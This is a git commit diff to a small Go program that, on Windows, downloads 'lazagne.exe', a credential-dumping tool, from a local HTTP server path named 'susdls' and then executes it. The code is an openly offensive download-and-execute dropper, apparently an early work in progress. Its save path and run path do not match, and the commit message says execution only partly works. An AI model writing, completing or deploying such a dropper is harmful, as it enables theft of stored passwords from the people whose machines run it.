64cec3536e2027a48fc9edee3a83187a5fef6e95
Josh Hackney <josh.hackney13@gmail.com>
2021-10-13 21:27:47 -0400

    downloader is working, executing the file sorta works but outputs incorrectly

--- main.go
+++ main.go
@@ -5,25 +5,41 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"os/exec"
+	"os/user"
+	"runtime"
 )
 
 func main() {
-	var runprog string
-	fmt.Println("Press any key to continue")
-	fmt.Scanln(&runprog)
+	user, err := user.Current()
+	if err != nil {
+		panic(err)
+	}
+
+	fileName := "lazagne.exe"
+	filePath := user.HomeDir + "\\Downloads\\" + fileName
+	fmt.Println("currently set filepath: ", filePath)
+	platform := runtime.GOOS
+	if platform != "windows" {
+		fmt.Println("Platform not supported")
+		os.Exit(1)
+	}
 
 	baseURL := "http://192.168.1.21:8000/susdls/"
-	fileURL := "run-laZagne.bat"
-	dlURL := baseURL + fileURL
+
+	dlURL := baseURL + fileName
 
 	fmt.Println("Fetching file: " + dlURL)
-	err := DownloadFile("/%homepath%/Desktop/proc.exe", dlURL)
+	err = DownloadFile(fileName, dlURL)
 	if err != nil {
 		fmt.Println("Encountered error downloading file...")
 		fmt.Println(err)
 		panic(err)
 	}
-	fmt.Println("Downloaded: " + fileURL)
+	fmt.Println("Downloaded: " + fileName)
+
+	fmt.Println("Exectuing file: ", fileName)
+	err = ExectuteFile(filePath)
 }
 
 // DownloadFile will download a url to a local file. It's efficient because it will
@@ -46,5 +62,13 @@ func DownloadFile(filepath string, url string) error {
 
 	// Write the body to file
 	_, err = io.Copy(out, resp.Body)
+	return err
+}
+
+func ExectuteFile(filepath string) error {
+	output, err := exec.Command(filepath).Output()
+	fmt.Println(output)
+	fmt.Println(err)
+
 	return err
 }
